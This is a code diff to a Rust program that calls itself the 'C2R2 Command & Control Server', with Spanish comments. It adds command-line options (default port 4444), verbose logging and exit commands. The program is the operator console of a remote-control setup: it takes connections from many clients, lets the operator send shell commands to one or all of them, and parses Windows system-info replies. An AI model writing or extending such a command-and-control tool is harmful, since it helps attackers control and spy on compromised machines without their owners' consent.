@@ -7,8 +7,26 @@ use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::io::{self, BufRead};
+use clap::Parser;
 
 type ClientId = u64;
+
+#[derive(Parser)]
+#[command(name = "c2r2-server")]
+#[command(about = "C2R2 Command & Control Server", long_about = None)]
+struct Args {
+    /// Puerto donde escuchar conexiones
+    #[arg(short, long, default_value_t = 4444)]
+    port: u16,
+    
+    /// Dirección IP donde bindear (0.0.0.0 para todas las interfaces)
+    #[arg(short, long, default_value = "0.0.0.0")]
+    bind: String,
+    
+    /// Modo verboso
+    #[arg(short, long)]
+    verbose: bool,
+}
 
 // Estructura para manejar cada cliente
 struct ClientHandle {
@@ -23,7 +41,7 @@ struct ClientHandle {
 static SELECTED_CLIENT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
 
 // Maneja la comunicación con un cliente
-async fn handle_client(mut socket: tokio::net::tcp::OwnedReadHalf, id: ClientId, clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>) {
+async fn handle_client(mut socket: tokio::net::tcp::OwnedReadHalf, id: ClientId, clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>, verbose: bool) {
     let mut buf = vec![0u8; 4096]; // Buffer más grande para respuestas
 
     loop {
@@ -41,6 +59,10 @@ async fn handle_client(mut socket: tokio::net::tcp::OwnedReadHalf, id: ClientId,
                 println!("📨 [{}] Respuesta:", id);
                 println!("{}", response);
                 println!(); // Línea en blanco para separar
+                
+                if verbose {
+                    println!("🔍 [DEBUG] Bytes recibidos: {}", n);
+                }
                 
                 // Actualizar información del cliente si es necesario
                 update_client_info(id, &response, &clients).await;
@@ -64,9 +86,9 @@ async fn update_client_info(id: ClientId, response: &str, clients: &Arc<Mutex<Ha
         }
         
         // Detectar respuesta de información del OS
-        if response.contains("ProductName") && client.os_info.is_none() {
+        if response.contains("OS Name") && client.os_info.is_none() {
             // Extraer nombre del producto de Windows
-            if let Some(product_line) = response.lines().find(|line| line.contains("ProductName")) {
+            if let Some(product_line) = response.lines().find(|line| line.contains("OS Name")) {
                 if let Some(product_name) = product_line.split(':').nth(1) {
                     client.os_info = Some(product_name.trim().to_string());
                 }
@@ -173,8 +195,9 @@ fn handle_command(cmd: &str, clients: &Arc<Mutex<HashMap<ClientId, ClientHandle>
                 println!("❌ Cliente {} no existe", id);
             }
         }
-        "/cmd_selected" => {
-            println!("ℹ️ Use /cmd <comando> después de seleccionar un cliente con /select <id>");
+        "/exit" | "/quit" => {
+            println!("👋 Cerrando servidor...");
+            std::process::exit(0);
         }
         "/help" => {
             println!("📖 Comandos disponibles:");
@@ -182,6 +205,7 @@ fn handle_command(cmd: &str, clients: &Arc<Mutex<HashMap<ClientId, ClientHandle>
             println!("  /select <id>             -> selecciona un cliente por ID");
             println!("  /cmd <comando>           -> envía comando al cliente seleccionado");
             println!("  /cmd_all <comando>       -> envía comando a todos los clientes");
+            println!("  /exit, /quit             -> cierra el servidor");
             println!("  /help                    -> muestra esta ayuda");
         }
         _ => println!("❓ Comando desconocido: {}. Use /help para ver comandos disponibles.", parts[0]),
@@ -190,8 +214,18 @@ fn handle_command(cmd: &str, clients: &Arc<Mutex<HashMap<ClientId, ClientHandle>
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let listener = TcpListener::bind("0.0.0.0:4444").await?;
-    println!("🚀 Server escuchando en 0.0.0.0:4444");
+    let args = Args::parse();
+    
+    let bind_addr = format!("{}:{}", args.bind, args.port);
+    let listener = TcpListener::bind(&bind_addr).await?;
+    
+    println!("🚀 C2R2 Server v1.0");
+    println!("🔗 Escuchando en {}", bind_addr);
+    if args.verbose {
+        println!("🔍 Modo verboso activado");
+    }
+    println!("📝 Use /help para ver comandos disponibles");
+    println!("{}", "-".repeat(50));
 
     let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
     let id_gen = AtomicU64::new(0);
@@ -273,6 +307,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         // Tarea: lector (procesa las respuestas del cliente)
         let clients_reader = Arc::clone(&clients);
-        tokio::spawn(handle_client(reader, id, clients_reader));
+        let verbose = args.verbose;
+        tokio::spawn(handle_client(reader, id, clients_reader, verbose));
     }
 }
